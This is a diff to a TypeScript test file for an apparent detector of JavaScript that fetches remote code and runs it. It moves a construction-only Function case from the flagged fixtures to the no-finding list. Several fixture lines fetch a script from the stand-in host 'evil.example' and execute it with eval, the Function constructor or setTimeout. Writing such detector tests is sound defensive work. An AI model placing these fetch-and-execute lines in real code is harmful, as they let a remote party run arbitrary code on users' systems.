@@ -37,8 +37,6 @@ const CHAINED: Record<string, string> = {
     "fetch('https://evil.example/x.js').then((r) => r.text()).then(function load(t){ return eval(t); })\n",
   "the fetched text as the Function constructor's body argument, invoked":
     "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => new Function('x', t)())\n",
-  "bare Function as the callback":
-    "fetch('https://evil.example/x.js').then((r) => r.text()).then(Function)\n",
   "the fetched text handed to setTimeout as a string":
     "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => setTimeout(t, 0))\n",
   "indirect eval of the fetched text":
@@ -84,6 +82,12 @@ test("fetched data that is not executed keeps no finding", () => {
     "fetch('https://example.com/x.txt').then((r) => r.text()).then(function(t){ return console.log(t); })\n",
     // Constructing a Function without calling it executes nothing.
     "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => new Function('x', t))\n",
+    // A bare Function callback only constructs; the body never runs.
+    "fetch('https://example.com/x.txt').then((r) => r.text()).then(Function)\n",
+    // A single-argument Function construction, uninvoked, runs nothing.
+    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => new Function(t))\n",
+    // Same construction-only case inside a function-expression callback.
+    "fetch('https://example.com/x.txt').then((r) => r.text()).then(function(t){ return new Function(t); })\n",
     // setTimeout with a function wraps the text; it does not run it.
     "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => setTimeout(() => show(t), 0))\n",
   ]) {
